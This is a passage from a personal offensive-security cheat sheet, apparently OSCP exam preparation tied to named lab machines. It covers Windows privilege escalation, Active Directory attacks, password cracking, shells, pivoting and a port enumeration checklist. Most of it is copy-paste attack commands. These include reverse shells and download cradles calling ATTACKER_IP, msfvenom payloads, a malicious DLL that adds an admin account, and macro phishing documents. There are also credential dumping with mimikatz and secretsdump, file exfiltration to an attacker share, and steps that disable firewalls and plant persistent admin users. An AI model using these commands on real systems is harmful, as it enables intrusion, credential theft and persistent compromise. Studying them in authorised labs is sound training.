dir /s /b C:\*.txt | findstr -i "transcript output"
type C:\output.txt
type C:\Transcripts\*.txt
Get-ChildItem -Path C:\ -Filter "*.txt" -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password|credential|secret" -List

# PowerShell history — saved commands:
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Get-Content (Get-PSReadLineOption).HistorySavePath
```

### Service Binary Hijacking

```powershell
# Find modifiable services
accesschk.exe /accepteula -uwcqv "Everyone" *
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
# Or use PowerUp.ps1

# If SERVICE_ALL_ACCESS or SERVICE_CHANGE_CONFIG:
sc config <service> binpath= "C:\Users\Public\reverse.exe"
sc stop <service>
sc start <service>

# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows" | findstr /v """
# Place binary in writable directory in the path
```

**Machines:** Return (Server Operators → service path), Payday

### DLL Hijacking

```c
// Compile malicious DLL
// malicious.c
#include <stdlib.h>
#include <windows.h>
BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        system("cmd.exe /c net user hacker Password123! /add && net localgroup administrators hacker /add");
    }
    return TRUE;
}
// Compile: x86_64-w64-mingw32-gcc malicious.c -shared -o malicious.dll
```

**Machines:** Giddy (UniFi Video DLL hijack), Jacko

### SeImpersonatePrivilege (Potato Family)

```powershell
# Check
whoami /priv
# Look for: SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege

# PrintSpoofer (Windows 10 / Server 2016-2019)
.\PrintSpoofer64.exe -i -c cmd

# GodPotato (works on newer systems too)
.\GodPotato-NET4.exe -cmd "cmd /c C:\Users\Public\nc.exe ATTACKER_IP PORT -e cmd.exe"

# JuicyPotato (older systems, pre-2019)
.\JuicyPotato.exe -l 1337 -p cmd.exe -a "/c C:\Users\Public\nc.exe ATTACKER_IP PORT -e cmd.exe" -t * -c {CLSID}

# SweetPotato
.\SweetPotato.exe -p C:\Users\Public\nc.exe -a "ATTACKER_IP PORT -e cmd.exe"
```

**Machines:** Artic, Bounty, Jeeves, Snookumsz, Nagoya, Billyboss, Hokkaido, Access (PG)

### AlwaysInstallElevated

```powershell
# Check
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
# Both must = 1

# Exploit
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi -o shell.msi
msiexec /quiet /qn /i shell.msi
```

**Machines:** Love

### Stored Credentials / RunAs

```powershell
# Check for saved credentials
cmdkey /list
# If Administrator creds stored:
runas /savecred /user:administrator cmd.exe
```

**Machines:** Access (HTB)

---

## Active Directory Attacks

### AD Enumeration

```bash
# BloodHound collection (from Linux)
bloodhound-python -u 'user' -p 'pass' -d domain.local -ns $DC_IP -c all

# BloodHound collection (from Windows)
.\SharpHound.exe -c All
Import-Module .\SharpHound.ps1; Invoke-BloodHound -CollectionMethod All

# Manual enumeration with PowerView
Import-Module .\PowerView.ps1
Get-DomainUser | select samaccountname,description
Get-DomainGroup -MemberIdentity "user" | select samaccountname
Get-DomainComputer | select dnshostname,operatingsystem

# With NetExec/CrackMapExec
crackmapexec smb $DC_IP -u 'user' -p 'pass' --users
crackmapexec smb $DC_IP -u 'user' -p 'pass' --groups
crackmapexec ldap $DC_IP -u 'user' -p 'pass' -M get-desc-users  # Passwords in description
```

### AS-REP Roasting

```bash
# Without credentials (need valid usernames)
impacket-GetNPUsers domain.local/ -usersfile users.txt -dc-ip $DC_IP -format hashcat

# With credentials (find all vulnerable accounts)
impacket-GetNPUsers domain.local/user:pass -dc-ip $DC_IP -request

# Crack hash
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```

**Machines:** Forest, Sauna, Blackfield

### Kerberoasting

```bash
# With credentials
impacket-GetUserSPNs domain.local/user:pass -dc-ip $DC_IP -request

# Crack hash
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

**Machines:** Active (Administrator SPN)

### GPP / cPassword

```bash
# Search SYSVOL for Groups.xml
smbclient //$DC_IP/SYSVOL -U 'user%pass' -c 'recurse on; prompt off; mget *'
find . -name "Groups.xml" -o -name "*.xml" | xargs grep -li cpassword

# Decrypt
gpp-decrypt <cpassword_hash>

# Automated
crackmapexec smb $DC_IP -u user -p pass -M gpp_autologin
crackmapexec smb $DC_IP -u user -p pass -M gpp_password
```

**Machines:** Active, Querier

### Pass-the-Hash

```bash
# WinRM
evil-winrm -i $IP -u Administrator -H 'NTLM_HASH'

# PsExec
impacket-psexec -hashes :NTLM_HASH administrator@$IP

# WMIExec
impacket-wmiexec -hashes :NTLM_HASH administrator@$IP

# SMBExec
impacket-smbexec -hashes :NTLM_HASH administrator@$IP

# CrackMapExec
crackmapexec smb $IP -u Administrator -H NTLM_HASH
crackmapexec winrm $IP -u Administrator -H NTLM_HASH
```

**Machines:** Jeeves

### DCSync Attack

```bash
# Requires: DS-Replication-Get-Changes + DS-Replication-Get-Changes-All
# Check with BloodHound or PowerView
impacket-secretsdump domain.local/user:pass@$DC_IP
impacket-secretsdump -hashes :HASH domain.local/user@$DC_IP

# Mimikatz
lsadump::dcsync /domain:domain.local /user:Administrator
```

**Machines:** Forest (WriteDacl→DCSync), Sauna (svc_loanmgr DCSync), Blackfield

### WriteDACL / ACL Abuse

```powershell
# If user has WriteDACL over domain object (Forest):
# Grant DCSync permissions
$SecPassword = ConvertTo-SecureString 'password' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('domain\user', $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity user -Rights DCSync

# Or with impacket
impacket-dacledit -action write -rights DCSync -principal user -target-dn "DC=domain,DC=local" domain.local/user:pass
```

**Machines:** Forest

### ForceChangePassword

```bash
# If user has ForceChangePassword over another (Blackfield)
rpcclient -U 'user%pass' $DC_IP
> setuserinfo2 target_user 23 'NewPassword123!'
```

**Machines:** Blackfield

### ADCS (Certificate Services) Exploitation

```bash
# Enumerate vulnerable templates
certipy find -u user@domain.local -p 'pass' -dc-ip $DC_IP -vulnerable

# ESC1 - Enrollee supplies subject
certipy req -u user@domain.local -p 'pass' -ca 'CA-NAME' -template 'TEMPLATE' -upn administrator@domain.local -dc-ip $DC_IP
certipy auth -pfx administrator.pfx -dc-ip $DC_IP

# ESC9 - No security extension
certipy shadow auto -u user@domain.local -p 'pass' -account target -dc-ip $DC_IP
```

**Machines:** Escape (ESC1), Certified (ESC9)

### Resource-Based Constrained Delegation (RBCD)

```bash
# If user has GenericWrite/GenericAll on a computer object
# Add a fake computer account
impacket-addcomputer domain.local/user:pass -computer-name 'FAKE$' -computer-pass 'Password123'

# Set RBCD
impacket-rbcd domain.local/user:pass -action write -delegate-to TARGET$ -delegate-from FAKE$

# Get service ticket
impacket-getST domain.local/'FAKE$':'Password123' -spn cifs/target.domain.local -impersonate Administrator -dc-ip $DC_IP

# Use the ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass domain.local/administrator@target.domain.local
```

**Machines:** Resourced

### LAPS

```bash
# Read LAPS password (need appropriate AD group membership)
crackmapexec ldap $DC_IP -u user -p pass --module laps
crackmapexec smb $DC_IP -u user -p pass --laps

# PowerView
Get-DomainComputer -Identity target | select ms-Mcs-AdmPwd
```

**Machines:** Timelapse, Hutch

### Silver Ticket

```bash
# Need: service NTLM hash, domain SID, target SPN
impacket-ticketer -nthash <SERVICE_HASH> -domain-sid <SID> -domain domain.local -spn MSSQLSvc/target.domain.local Administrator

export KRB5CCNAME=Administrator.ccache
impacket-mssqlclient -k domain.local/Administrator@target.domain.local
```

**Machines:** Escape (MSSQL silver ticket)

### Azure AD Connect

```powershell
# Extract credentials from Azure AD Connect database (Monteverde)
# Use AdDecrypt.exe or manual SQL extraction
sqlcmd -S MONTEVERDE -d ADSync -Q "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
# Then decrypt using the extracted values
```

**Machines:** Monteverde

---

## Password Attacks

### Hash Identification & Cracking Quick Reference

| Hash Type | Hashcat Mode | Example |
|-----------|-------------|---------|
| MD5 | -m 0 | 32 hex chars |
| NTLM | -m 1000 | 32 hex chars |
| NTLMv2 | -m 5600 | Responder capture |
| AS-REP | -m 18200 | $krb5asrep$... |
| Kerberoast TGS | -m 13100 | $krb5tgs$... |
| bcrypt | -m 3200 | $2a$/$2b$/$2y$ |
| SHA-512 crypt | -m 1800 | $6$... |
| KeePass | -m 13400 | keepass2john output |
| SSH key | -m 22921 | ssh2john output |

```bash
# Identify unknown hashes
hashid -m "hash_here"

# All cracking commands (copy-paste ready)
sudo hashcat -m 18200 asrep.hash rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force  # AS-REP
sudo hashcat -m 13100 tgs.hash rockyou.txt --force                                            # Kerberoast
sudo hashcat -m 1000 ntlm.hash rockyou.txt --force                                            # NTLM
sudo hashcat -m 5600 ntlmv2.hash rockyou.txt --force                                          # NTLMv2
sudo hashcat -m 3200 bcrypt.hash rockyou.txt                                                   # bcrypt
sudo hashcat -m 13400 keepass.hash rockyou.txt --force                                         # KeePass
sudo hashcat -m 22921 ssh.hash rockyou.txt --force                                             # SSH key
fcrackzip -u -D -p rockyou.txt file.zip                                                        # ZIP
gpp-decrypt "<cpassword_hash>"                                                                  # GPP
office2john doc.doc > doc.hash && john doc.hash --wordlist=rockyou.txt                         # Office
pdf2john doc.pdf > pdf.hash && john pdf.hash --wordlist=rockyou.txt                            # PDF
```

### Default Passwords to Always Try
```
admin:admin  |  admin:password  |  admin:Password1  |  guest:guest
username:username  |  <machinename>:<machinename>  |  <servicename>:<servicename>
password / password1 / Password1 / Password@123 / Welcome1 / admin@123
```



### Password Spraying

```bash
# SMB
crackmapexec smb $DC_IP -u users.txt -p 'Password123' --continue-on-success

# Kerbrute
kerbrute passwordspray -d domain.local users.txt 'Password123' --dc $DC_IP

# Username=password check
crackmapexec smb $DC_IP -u users.txt -p users.txt --no-bruteforce --continue-on-success
```

**Machines:** Monteverde (password=username), Cicada (spray)

### NTLM Theft / Relay

```bash
# Responder
sudo responder -I tun0

# Trigger via:
# - SSRF to \\ATTACKER\share
# - MSSQL xp_dirtree \\ATTACKER\share
# - Phishing (HTML with UNC path)
# - Upload SCF/URL file to writable share

# Crack NetNTLMv2
hashcat -m 5600 hash.txt rockyou.txt
```

**Machines:** Querier, Giddy, Escape, Mailing, Flight

### Hydra Brute Force

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/login:user=^USER^&pass=^PASS^:Invalid" -t 16
hydra -l admin -P wordlist.txt ssh://$IP
hydra -l admin -P wordlist.txt ftp://$IP
```

---

## File Transfers

### Linux → Target

```bash
# Python HTTP server (on attacker)
python3 -m http.server 80

# On Linux target
wget http://ATTACKER_IP/file -O /tmp/file
curl http://ATTACKER_IP/file -o /tmp/file
```

### Windows → Target

```powershell
# PowerShell
(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP/file','C:\Users\Public\file')
iwr -uri http://ATTACKER_IP/file -outfile C:\Users\Public\file
Invoke-WebRequest http://ATTACKER_IP/file -OutFile C:\Users\Public\file

# Certutil
certutil -urlcache -f http://ATTACKER_IP/file C:\Users\Public\file

# Bitsadmin
bitsadmin /transfer job /download /priority high http://ATTACKER_IP/file C:\Users\Public\file
```

### SMB Transfer

```bash
# On attacker
impacket-smbserver share $(pwd) -smb2support -username user -password pass

# On Windows target
net use \\ATTACKER_IP\share /u:user pass
copy \\ATTACKER_IP\share\file C:\Users\Public\file
copy C:\Users\Public\loot.txt \\ATTACKER_IP\share\
```

---

## Shells & Upgrades

### Reverse Shells

```bash
# Bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# PowerShell
powershell -e <BASE64>
# Generate: pwsh -c '$Text = "IEX(New-Object Net.WebClient).downloadString(\"http://ATTACKER_IP/shell.ps1\")";$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text);$EncodedText = [Convert]::ToBase64String($Bytes);$EncodedText'

# Mkfifo (reliable)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f

# MSFvenom payloads
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf -o shell.elf
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe -o shell.exe
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe -o shell32.exe
msfvenom -p java/shell_reverse_tcp LHOST=IP LPORT=PORT -f war -o shell.war
msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -o shell.php
```

### Shell Upgrade (TTY)

```bash
# Python PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Then:
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
stty rows 40 cols 160

# Script
script -qc /bin/bash /dev/null

# rlwrap (on attacker side)
rlwrap nc -lvnp PORT
```

### Windows Shell Stabilization

```powershell
# ConPtyShell (full interactive)
# On attacker:
stty raw -echo; (stty size; cat) | nc -lvnp PORT

# On target:
IEX(IWR http://ATTACKER_IP/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell ATTACKER_IP PORT
```

---



---

## Client-Side Payloads

### Doc Files (Word Macros)
```bash
# Generate base64 payload, split into 50-char VBA strings
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f hta-psh -o evil.hta
# Split: python3 splitter.py (50-char chunks as VBA Str = Str + "...")
# Paste into Word macro, save as .doc/.docm, send to target
```

### ODS/XLS Files (LibreOffice Macros)
```bash
# Same payload splitting technique as Doc
# Create .ods in LibreOffice Calc -> Tools -> Macros -> paste
# Tools -> Customize -> Events -> Open Document -> assign macro
sendemail -f sender@localhost -t target@localhost -s $IP:25 -u "Spreadsheet" -m "Please check" -a exploit.ods
```

### Phishing with WebDAV + Library Files
```bash
# 1. Start WebDAV: wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root ./webdav/
# 2. Create config.Library-ms pointing to attacker WebDAV
# 3. Create install.lnk shortcut (powercat reverse shell)
# 4. Send via: swaks -t target@domain.com --from john@domain.com --server $SMTP --attach @config.Library-ms --body @body.txt
```

### NTLM Theft via File Upload
```bash
python3 ntlm_theft.py -g all -s <responder-ip> -f evil
sudo responder -I tun0 -vvv
# Upload .url/.lnk/.scf to writable SMB share or FTP
# When user browses -> NTLMv2 hash captured
```

## Pivoting & Tunneling

### Ligolo-ng - Justin's Pivoting Setup

```bash
# One-time setup
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up

# Start proxy (attacker)
proxy -selfcert -laddr 0.0.0.0:53

# Run agent (victim - disable firewall first if admin)
./agent.exe -connect <ATTACKER_IP>:53 -ignore-cert

# Add route + start tunnel
sudo ip route add <internal-range>/24 dev ligolo
# In Ligolo: session -> start

# Catch reverse shells through pivot (MS02 -> MS01 -> Kali)
listener_add --addr 0.0.0.0:443 --to 0.0.0.0:443 --tcp
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<MS01-internal-ip> LPORT=443 -f exe > rev.exe

# Access localhost-only services on victim
route_add --name ligolo --route 240.0.0.1/32
# Browse: http://240.0.0.1:8080
```

### SSH Tunneling

```bash
# Local port forward (access remote service through localhost)
ssh -L LOCAL_PORT:TARGET_IP:TARGET_PORT user@PIVOT_IP -N

# Dynamic port forward (SOCKS proxy)
ssh -D 1080 user@PIVOT_IP -N
# Configure proxychains.conf: socks5 127.0.0.1 1080
proxychains nmap -sT -Pn TARGET_IP

# Remote port forward (target can reach attacker)
ssh -R ATTACKER_PORT:TARGET_IP:TARGET_PORT user@ATTACKER_IP -N
```

### Chisel

```bash
# On attacker (server)
./chisel server --reverse --port 8000

# On target (client) — reverse SOCKS
./chisel client ATTACKER_IP:8000 R:socks

# On target — reverse port forward
./chisel client ATTACKER_IP:8000 R:LOCAL_PORT:127.0.0.1:TARGET_PORT

# Configure proxychains: socks5 127.0.0.1 1080
```

---

### Git Repository Enumeration
```bash
# If .git found on web: python3 git-dumper.py http://$IP/.git/ ./output
# On filesystem: git log -> git show <commit-id> (look for creds in diffs)
```

### OSCP AD Assumed Breach Entry
```bash
# You start with low-priv domain creds. Scan the external AD host first:
sudo nmap -Pn --open <ip>
# Connect via RDP or WinRM:
xfreerdp +clipboard /u:<user> /p:<password> /v:<ip> /dynamic-resolution /drive:shared,/home/kali/Windows
evil-winrm -i <ip> -u <user> -p <password> -d <domain>
```

## Useful One-Liners

```bash
# Quick credential search in files
grep -rn 'password\|passwd\|pwd\|secret\|key\|token' /var/www/ /opt/ /etc/ /home/ 2>/dev/null
grep -rn 'password\|passwd\|pwd' *.xml *.config *.ini *.txt *.cfg 2>/dev/null

# Find all .git directories
find / -name ".git" -type d 2>/dev/null

# SSH key hunting
find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null

# Extract users from /etc/passwd
cat /etc/passwd | grep '/bin/bash\|/bin/sh' | cut -d: -f1

# Generate username wordlist from names
# firstname, f.lastname, firstname.lastname, flastname
# Use username-anarchy or custom script

# Base64 encode/decode
echo -n 'text' | base64
echo 'base64string' | base64 -d

# URL encode
python3 -c "import urllib.parse; print(urllib.parse.quote('payload'))"

# Check for internal services (after foothold)
ss -tlnp | grep 127
netstat -tlnp | grep 127
# Common internal: MySQL(3306), PostgreSQL(5432), Redis(6379), Tomcat(8080)
```



---

## Windows Persistence & Post-Exploitation

### Establish Persistent Access (Do This IMMEDIATELY After Admin)
```bash
# Create local admin
net user admin-support Password123 /add
net localgroup administrators admin-support /add
net localgroup "Remote Desktop Users" admin-support /add
net localgroup "Remote Management Users" admin-support /add

# Enable RDP + WinRM
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
winrm quickconfig -force

# Kill firewall + disable UAC remote filtering
netsh advfirewall set allprofiles state off
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

### Dump Secrets (LSASS & SAM)
```bash
# Netexec (remote, preferred)
nxc smb $IP -u admin-support -p Password123 --sam --lsa --local-auth
nxc smb $IP -u admin-support -p Password123 -M lsassy --local-auth
nxc smb $IP -u admin-support -H <hash> --sam --lsa --local-auth

# Mimikatz (via RDP)
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
token::elevate
lsadump::sam
lsadump::secrets
lsadump::cache
```

### Post-Exploitation Loot Hunting
```powershell
# Screenshots FIRST
type C:\Users\Administrator\Desktop\proof.txt && whoami && hostname && ipconfig

# Find plaintext creds
Get-ChildItem -Path C:\ -Include *.txt,*.log,*.xml,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password|pass|pwd|credential" -Context 1,2

# KeePass databases
Get-ChildItem -Path C:\ -Include *.kdbx,*.pwm -Recurse -ErrorAction SilentlyContinue

# PowerShell history
type "C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

# FileZilla creds (Base64 encoded!)
type C:\Users\*\AppData\Roaming\FileZilla\recentservers.xml
```

### RunasCs.exe (Switch User Without RDP/WinRM)
```bash
RunasCs.exe /u:corp\svc_mssql /p:trustno1 /c:"cmd.exe"
# PowerShell variant:
Import-Module .\Invoke-RunasCs.ps1
Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "shell.exe"
```

### Service Exploitation Decision Tree
```
Can WRITE to service .exe?       -> Binary Replacement (copy shell.exe over it)
Can CHANGE binpath (sc config)?  -> sc config <svc> binpath= "shell.exe"
Service won't start?             -> sc config <svc> depend= "" (remove deps)
Can EDIT registry ImagePath?     -> reg add HKLM\SYSTEM\...\ImagePath /d "shell.exe"
None of above?                   -> Check DLL hijack (Procmon, accesschk)
```

---

## 🔲 STANDALONE MACHINE DECISION-TREE CHECKLIST

> **Use this as a sequential flowchart. Work top-to-bottom. Check every box.**
> **Time budget: ~2.5 hours per standalone (user + root)**
> **⚠️ PRACTICE RULE: If stuck 90 min with no shell, MOVE ON. A local.txt on machine #2 beats 3 hours on machine #1.**

### STANDALONE QUICK WINS FROM Practice scenario HISTORY
```
PROVEN PATTERNS (these worked in practice):
  ✅ FTP anonymous → Firefox profiles → firefox_decrypt → SSH creds (multiple practice attempts)
  ✅ Redis unauthenticated → redis-rogue-server → RCE (a practice attempt)
  ✅ Python library hijacking for root (writable /usr/lib/python* + cron) (a practice attempt)
  ✅ API info disclosure → leaked creds → direct service access (a practice attempt — but you missed the spray!)

YOUR MISSED OPPORTUNITIES (check these on EVERY standalone):
  ❌ Unattend.xml with cleartext/base64 passwords (a practice attempt — never checked)
  ❌ PowerShell transcripts with creds in commands (a practice attempt — never read)
  ❌ Leaked API creds that work on WinRM/SSH (a practice attempt — spent 2hrs on API headers instead)
  ❌ Expired passwords that still work on WinRM/SMBexec (a practice attempt — didn't try alternatives)
```

### PHASE 0 — TRIAGE (First 5 Minutes)

```
□ Run autorecon in background:  autorecon $IP --single-target
□ Identify OS via TTL:  ping -c 1 $IP  (TTL ~64 = Linux, TTL ~128 = Windows)
□ Quick nmap while autorecon runs:  sudo nmap -p- --min-rate 5000 -Pn $IP
□ Record all open ports immediately
□ Start taking notes/screenshots NOW
```

### PHASE 1 — ENUMERATION (Spend 30-45 min here MINIMUM)

#### □ IF port 21 (FTP) is open:
```
□ Try anonymous login:  ftp $IP  → user: anonymous / pass: (blank or anonymous)
□ If anonymous works → ls -la → look for creds, configs, backup files
□ Download everything:  prompt off → mget *
□ Check if you can UPLOAD (test with put test.txt)
□ If upload to web root → webshell path
□ Check version for exploits:  searchsploit <ftp_software> <version>
```

### FTP - Justin's Proven Techniques

**Brute-force with targeted wordlists:**
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://$IP
hydra -L users.txt -P /usr/share/seclists/Passwords/probable-v2-top1575.txt ftp://$IP
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt $IP ftp
```

**Custom wordlist from website content:**
```bash
cewl http://$IP:$PORT > cewl.list && cewl http://$IP:$PORT --lowercase >> cewl.list
hydra -L users.txt -P cewl.list ftp://$IP
```

**Recursive download + passive mode fix:**
```bash
wget -m --no-passive ftp://<user>:<pass>@$IP
# If "229 Extended Passive Mode" errors: ftp> passive  then  ftp> ls -al
```

**Upload webshells (binary mode first):**
```bash
ftp> binary
ftp> put simple-backdoor.php
# PHP:  /usr/share/webshells/php/simple-backdoor.php
# ASP:  /usr/share/webshells/asp/cmd.asp
# ASPX: /usr/share/webshells/aspx/cmd.aspx
```

**URI Redirection Attack (NTLM theft):**
```bash
python3 ntlm_theft.py -g all -s <responder-ip> -f evil
sudo responder -I tun0 -vvv
ftp> binary && ftp> mput evil*
hashcat -m 5600 hash.txt rockyou.txt
```

**Extract metadata:** `exiftool -a -u filename.pdf`

**PG Lessons:** FTP on non-standard ports (14020) may have creds in PDF metadata. Anonymous list but no download = brute-force privileged account.


#### □ IF port 22 (SSH) is open:
```
□ Note the version (banner grab) — usually not directly exploitable
□ SSH is typically your ENTRY POINT once you find creds elsewhere
□ If you find a username, try: password = username, machine name, common defaults
□ If you find an SSH key: chmod 600 id_rsa → ssh -i id_rsa user@$IP
□ If key is encrypted: ssh2john id_rsa > hash.txt → john hash.txt --wordlist=rockyou.txt
```

#### □ IF port 25/587 (SMTP) is open:
```
□ User enumeration:  smtp-user-enum -M VRFY -U users.txt -t $IP
□ Check for open relay (can you send mail as anyone?)
□ Look for exploits: searchsploit <smtp_software>
□ OpenSMTPD < 6.6.2 → CVE-2020-7247 RCE (Bratarina)
□ Sendmail + ClamAV → milter RCE (ClamAV machine)
```

#### □ IF port 53 (DNS) is open:
```
□ Zone transfer:  dig axfr @$IP domain.htb
□ Reverse lookup:  dig -x $IP @$IP
□ May reveal subdomains, internal hostnames
```

#### □ IF port 79 (Finger) is open:
```
□ Enumerate users:  finger @$IP
□ Brute force users:  finger-user-enum.pl -U users.txt -t $IP
□ (Sunday machine used this)
```

#### □ IF port 80/443 (HTTP/HTTPS) is open:
```
□ Browser: Visit the site, check EVERY page, read EVERY word
□ View source on every page (Ctrl+U) — look for comments, hidden dirs, versions
□ Check /robots.txt, /sitemap.xml, /.well-known/
□ Technology fingerprint:  whatweb http://$IP
□ Check for CMS: look for wp-login, /administrator, /admin, powered-by footers
□ Directory brute force (run in background):
    gobuster dir -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak,asp,aspx,jsp -t 50
□ Subdomain/vhost enumeration (if domain name known):
    gobuster vhost -u http://$DOMAIN -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
□ Check for default credentials on ANY login page
□ Check for .git exposure:  http://$IP/.git/HEAD
□ nikto -h http://$IP (run in background)

→ IF WordPress found:
    □ wpscan --url http://$IP/wp --enumerate ap,at,u
    □ Check plugin versions → searchsploit
    □ Try wp-login with admin:admin, admin:<machinename>
    □ If admin access → Appearance → Theme Editor → 404.php → PHP reverse shell

→ IF Joomla found:
    □ joomscan -u http://$IP
    □ Check /administrator login
    □ CVE-2023-23752 for info disclosure (Devvortex)

→ IF Drupal found:
    □ droopescan scan drupal -u http://$IP
    □ Check CHANGELOG.txt for version

→ IF Tomcat found:
    □ Try default creds: tomcat:tomcat, tomcat:s3cret, admin:admin
    □ Check /manager/html, /host-manager/html
    □ If creds work → deploy WAR reverse shell
    □ If can read tomcat-users.xml via LFI → extract creds

→ IF login form found:
    □ Try admin:admin, admin:password, admin:<machinename>
    □ Test for SQLi: ' OR 1=1-- -
    □ Test for XSS (may be useful for stored XSS→admin cookie theft)
    □ Brute force if no lockout:  hydra -l admin -P rockyou.txt $IP http-post-form "..."
    □ Check if registration is available → register and look for authn vulns

→ IF file upload found:
    □ Try uploading PHP reverse shell directly
    □ If blocked: try double extension (.php.jpg), case change (.pHp), null byte (.php%00.jpg)
    □ Try adding magic bytes (GIF89a; at top of PHP file)
    □ Try uploading .htaccess first (AddType application/x-httpd-php .evil)
    □ Check where files are stored → browse to trigger execution

→ IF API/parameters found:
    □ Test every parameter for: SQLi, LFI, RFI, SSRF, command injection
    □ LFI test: ../../etc/passwd, php://filter/convert.base64-encode/resource=
    □ RFI test: http://ATTACKER_IP/test (check for callback)
    □ Command injection: ; id  |  | id  |  $(id)  |  `id`
    □ SSRF: http://127.0.0.1:PORT, try fuzzing internal ports
```

#### □ IF port 88 (Kerberos) is open:
```
→ This is Active Directory — switch to the AD checklist below
```

#### □ IF port 110/143/993/995 (POP3/IMAP) is open:
```
□ Try connecting:  nc -nv $IP 110 → USER user → PASS pass
□ If you get creds elsewhere → check for email with sensitive info
□ LIST → RETR 1 (download messages)
```

#### □ IF port 111/2049 (NFS) is open:
```
□ Show exports:  showmount -e $IP
□ Mount shares:  sudo mount -t nfs $IP:/share /tmp/nfs
□ Look for SSH keys, config files, creds
□ Check if no_root_squash is set (allows writing as root)
```

#### □ IF port 135/139/445 (SMB) is open:
```
□ Null session check:
    smbclient -L //$IP -N
    smbmap -H $IP
    crackmapexec smb $IP -u '' -p '' --shares
    enum4linux -a $IP
□ Try guest access:  smbmap -H $IP -u 'guest' -p ''
□ If shares accessible → download everything, look for:
    - Credentials in config files
    - Password in file names or content
    - GPP/Groups.xml files (→ gpp-decrypt)
    - Database files (.mdb, .kdbx, .accdb)
    - Scripts with hardcoded passwords
□ Check if any share is WRITABLE (potential webshell drop or SCF file upload)
□ Check version:  nmap -p445 --script smb-vuln* $IP (EternalBlue etc.)
```

#### □ IF port 161 (SNMP) is open:
```
□ Community string brute: onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $IP
□ Walk with found string: snmpwalk -v2c -c public $IP
□ Check for: running processes, installed software, usernames, network configs
□ Specific OIDs for creds: nsExtendOutputFull, hrSWInstalledName
□ (Pandora + Monitored machines used SNMP for initial creds)
```

#### □ IF port 1433 (MSSQL) is open:
```
□ Try default creds:  impacket-mssqlclient sa:sa@$IP
□ If access: enable xp_cmdshell → RCE
□ NTLM theft:  EXEC xp_dirtree '\\ATTACKER_IP\share'
□ Check for linked servers
```

#### □ IF port 3306 (MySQL) is open:
```
□ Try default creds:  mysql -h $IP -u root -p (blank, root, toor)
□ If access: SELECT LOAD_FILE('/etc/passwd'), UDF exploitation if running as root
□ Dump databases for creds
```

#### □ IF port 3389 (RDP) is open:
```
□ Note for later — use when you find Windows creds
□ xfreerdp /v:$IP /u:user /p:pass /cert-ignore /dynamic-resolution
□ Check for BlueKeep if old OS: nmap -p3389 --script rdp-vuln* $IP
```

#### □ IF port 5985/5986 (WinRM) is open:
```
□ Note for later — use with creds or hash:
    evil-winrm -i $IP -u user -p 'pass'
    evil-winrm -i $IP -u user -H 'NTLM_HASH'
```

#### □ IF port 6379 (Redis) is open:
```
□ Try unauthenticated access:  redis-cli -h $IP
□ INFO, CONFIG GET dir, CONFIG GET dbfilename
□ Write webshell if web root is known
□ Write SSH key to authorized_keys
□ (Sybaris machine used Redis→cron)
```


### Uncommon But Important Ports

